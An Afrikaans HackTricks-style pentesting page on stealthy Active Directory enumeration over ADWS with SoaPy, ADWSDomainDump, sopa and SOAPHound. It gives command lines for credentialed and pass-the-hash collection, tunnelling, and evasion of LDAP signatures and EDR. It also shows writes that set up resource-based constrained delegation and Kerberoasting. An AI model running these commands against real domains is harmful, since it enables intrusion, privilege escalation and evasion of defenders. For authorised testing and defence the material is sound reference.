# Active Directory Web Services (ADWS)-enumering en stealth-versameling

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **by verstek op elke Domain Controller sedert Windows Server 2008 R2 geaktiveer** en luister op TCP **9389**. Ten spyte van die naam is **geen HTTP betrokke nie**. In plaas daarvan stel die diens LDAP-agtige data bloot deur ’n stapel eie .NET-framingprotokolle:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer binne hierdie binêre SOAP-rame ingekapsuleer is en oor ’n ongewone poort beweeg, is **enumerering deur ADWS baie minder geneig om geïnspekteer, gefiltreer of met handtekeninge opgespoor te word as klassieke LDAP/389- en 636-verkeer**. Vir operateurs beteken dit:<sup>[[1]](#references)[[7]](#references)</sup>

* Meer stealthy verkenning – Blue teams fokus dikwels op LDAP-navrae.
* Vryheid om data van **nie-Windows-gashere (Linux, macOS)** in te samel deur 9389/TCP deur ’n SOCKS-proxy te tonnel.
* Dieselfde data as wat jy deur LDAP sou verkry (gebruikers, groepe, ACL’s, skema, ens.) en die vermoë om **skryfbewerkings** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word met WS-Enumeration geïmplementeer: elke navraag begin met ’n `Enumerate`-boodskap wat die LDAP-filter/eienskappe definieer en ’n `EnumerationContext`-GUID terugstuur, gevolg deur een of meer `Pull`-boodskappe wat resultate tot by die bedienerbepaalde resultaatvenster stroom.<sup>[[7]](#references)</sup> Kontekste verval ná ongeveer 30 minute, dus moet nutsgoed resultate óf in bladsye verdeel óf filters opbreek (voorvoegselnavrae per CN) om te voorkom dat die toestand verlore gaan.<sup>[[8]](#references)</sup> Wanneer jy vir sekuriteitsbeskrywers vra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID`-beheer om SACL’s weg te laat; anders laat ADWS eenvoudig die `nTSecurityDescriptor`-eienskap uit sy SOAP-respons weg.

> LET WEL: ADWS word ook deur baie RSAT GUI/PowerShell-nutsgoed gebruik, dus kan die verkeer met wettige administrateuraktiwiteit saamsmelt.

## SoaPy – Inheemse Python-kliënt

[SoaPy](https://github.com/logangoins/soapy) is ’n **volledige herimplementering van die ADWS-protokolstapel in suiwer Python**. Dit bou die NBFX/NBFSE/NNS/NMF-rame byte vir byte, wat versameling vanaf Unix-agtige stelsels moontlik maak sonder om aan die .NET-runtime te raak.<sup>[[1]](#references)[[2]](#references)</sup>

### Sleutelkenmerke

* Ondersteun **proxying deur SOCKS** (nuttig vanaf C2-implants).
* Fyn ingestelde soekfilters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **skryfbewerkings** ( `--set` / `--delete` ).
* **BOFHound-uitsetmodus** vir direkte invoer in BloodHound.<sup>[[3]](#references)</sup>
* `--parse`-vlag om tydstempels / `userAccountControl` te verfraai wanneer menslike leesbaarheid nodig is.<sup>[[2]](#references)</sup>

### Gerigte versamelvlae en skryfbewerkings

SoaPy sluit saamgestelde skakelaars in wat die algemeenste LDAP-jagtake oor ADWS naboots: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rou `--query` / `--filter`-opsies vir pasgemaakte uittreksels. Kombineer dit met skryfprimitiewe soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-stadiëring vir gerigte Kerberoasting) en `--asrep` (skakel `DONT_REQ_PREAUTH` in `userAccountControl` aan).<sup>[[2]](#references)</sup>

Voorbeeld van ’n gerigte SPN-soektog wat slegs `samAccountName` en `servicePrincipalName` terugstuur:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Gebruik dieselfde gasheer/geloofsbriewe om bevindings onmiddellik te bewapen: dump RBCD-geskikte objek­te met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om ’n Resource-Based Constrained Delegation-ketting op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikroete).

### Installasie (operateurgasheer)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Fork van `ldapdomaindump` wat LDAP queries vervang met ADWS calls oor TCP/9389 om LDAP-signature hits te verminder.
* Voer ’n aanvanklike bereikbaarheidstoets op 9389 uit, tensy `--force` deurgegee word (slaan die toets oor as poortskanderings lawaaierig/gefiltreer is).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon, met ’n suksesvolle omseiling in die README.<sup>[[4]](#references)</sup>

### Installasie

```bash
pipx install .
```

### Gebruik

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipiese uitvoer log die 9389-bereikbaarheidstoets, ADWS-bind en die begin/einde van die dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - ’n praktiese kliënt vir ADWS in Golang

Net soos soapy implementeer [sopa](https://github.com/Macmod/sopa) die ADWS-protokolstapel (MS-NNS + MC-NMF + SOAP) in Golang en stel dit opdragreëlvlae beskikbaar om ADWS-oproepe soos die volgende uit te voer:<sup>[[5]](#references)</sup>

* **Object-soek en -herwinning** - `query` / `get`
* **Object-lewensiklus** - `create [user|computer|group|ou|container|custom]` en `delete`
* **Attribute-redigering** - `attr [add|replace|delete]`
* **Rekeningbestuur** - `set-password` / `change-password`
* en ander, soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ens.

### Hoogtepunte van protokolkartering

* LDAP-styl-soektogte word uitgevoer via **WS-Enumeration** (`Enumerate` + `Pull`), met attribute-projeksie, omvangbeheer (Base/OneLevel/Subtree) en paginering.
* Die haal van ’n enkele object gebruik **WS-Transfer** `Get`; attribute-veranderings gebruik `Put`; uitvee gebruik `Delete`.
* Ingeboude object-skepping gebruik **WS-Transfer ResourceFactory**; pasgemaakte objects gebruik ’n **IMDA AddRequest** wat deur YAML-sjablone aangedryf word.
* Wagwoordbewerkings is **MS-ADCAP**-aksies (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ontdekking van metadata sonder verifikasie (mex)

ADWS stel WS-MetadataExchange sonder geloofsbriewe beskikbaar, wat ’n vinnige manier is om blootstelling te bevestig voordat jy verifieer:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC-ontdekking- en Kerberos-teikenkeusenotas

Sopa kan DC's via SRV oplos as `--dc` weggelaat word en `--domain` verskaf word. Dit doen navrae in hierdie volgorde en gebruik die teiken met die hoogste prioriteit:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Bedryfsgewys, verkies ’n resolver wat deur ’n DC beheer word om foute in gesegmenteerde omgewings te vermy:

* Gebruik `--dns <DC-IP>` sodat **alle** SRV/PTR/voorwaartse lookups deur die DC DNS gaan.
* Gebruik `--dns-tcp` wanneer UDP geblokkeer is of SRV-antwoorde groot is.
* As Kerberos geaktiveer is en `--dc` ’n IP is, doen sopa ’n **omgekeerde PTR** om ’n FQDN te verkry vir korrekte SPN/KDC-teikening. As Kerberos nie gebruik word nie, vind geen PTR-lookup plaas nie.

Voorbeeld (IP + Kerberos, DNS wat deur die DC gedwing word):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Auth-materiaalopsies

Benewens gewone tekswagwoorde, ondersteun sopa **NT-hashes**, **Kerberos AES-sleutels**, **ccache** en **PKINIT-sertifikate** (PFX of PEM) vir ADWS-auth. Kerberos word geïmpliseer wanneer `--aes-key`, `-c` (ccache) of sertifikaatgebaseerde opsies gebruik word.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Pasgemaakte objek-skepping via templates

Vir arbitrêre objekklasse gebruik die `create custom`-opdrag ’n YAML-template wat na ’n IMDA `AddRequest` karteer:<sup>[[5]](#references)</sup>

* `parentDN` en `rdn` definieer die houer en relatiewe DN.
* `attributes[].name` ondersteun `cn` of namespaced `addata:cn`.
* `attributes[].type` aanvaar `string|int|bool|base64|hex` of eksplisiete `xsd:*`.
* Moet **nie** `ad:relativeDistinguishedName` of `ad:container-hierarchy-parent` insluit nie; sopa voeg hulle in.
* `hex`-waardes word na `xsd:base64Binary` omgeskakel; gebruik `value: ""` om leë stringe in te stel.

## SOAPHound – ADWS-versameling met hoë volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is ’n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-versoenbare JSON uitstuur. Dit bou een keer ’n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` (`--buildcache`), en hergebruik dit dan vir `--bhdump`-, `--certdump`- (ADCS) of `--dnsdump`- (AD-geïntegreerde DNS) deurlope met hoë volume, sodat slegs ~35 kritieke attribute ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) verdeel navrae outomaties volgens CN-voorvoegsel om onder die EnumerationContext-time-out van 30 minute in groot forests te bly.<sup>[[8]](#references)</sup>

Tipiese werkvloei op ’n domeingekoppelde operateur-VM:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Uitgevoerde JSON kan direk in SharpHound/BloodHound-workflows ingevoer word—sien [BloodHound-methodologie](bloodhound.md) vir idees oor stroomaf-grafieke. AutoSplit maak SOAPHound bestand teen woude met miljoene objekterwyl dit die aantal navrae laer hou as ADExplorer-styl-snapshots.

## Stealth AD-insamelingswerkvloei

Die volgende werkvloei wys hoe om **domein- en ADCS-objekte** oor ADWS te enumereer, dit na BloodHound JSON om te skakel en aanvalspaaie op grond van sertifikate op te spoor – alles vanaf Linux:

1. **Tonnel 9389/TCP** vanaf die teikennetwerk na jou masjien (bv. via Chisel, Meterpreter, SSH-dinamiese poortaanstuur, ens.). Voer `export HTTPS_PROXY=socks5://127.0.0.1:1080` uit of gebruik SoaPy se `--proxyHost/--proxyPort`.

2. **Versamel die worteldomeinobjek:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Versamel ADCS-verwante objekte uit die Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Skakel om na BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Laai die ZIP op** in die BloodHound GUI en voer cypher-navrae uit soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` om sertifikaat-eskalasiepaaie (ESC1, ESC8, ens.) bloot te lê.

### Skryf na msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir ’n volledige **Resource-Based Constrained Delegation**-ketting (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Gereedskapopsomming

| Doel | Gereedskap | Notas |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| ADWS enumeration met hoë volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS-modusse |
| BloodHound-invoer | [BOFHound](https://github.com/bohops/BOFHound) | Skakel SoaPy/ldapsearch-logboeke om |
| Sertifikaatkompromittering | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproxy word |
| ADWS enumeration en objekveranderings | [sopa](https://github.com/Macmod/sopa) | Generiese kliënt om met bekende ADWS-eindpunte te koppel - maak enumeration, objekskepping, kenmerkveranderings en wagwoordveranderings moontlik |

## References

- [1] [SpecterOps – Maak seker dat jy SOAP(y) gebruik – ’n Gids vir operateurs oor stealthy AD-versameling met ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX-, MC-NBFSE-, MS-NNS- en MC-NMF-spesifikasies](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy enumeration van Active Directory-omgewings deur ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-nutsding om Active Directory-data via ADWS in te samel](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
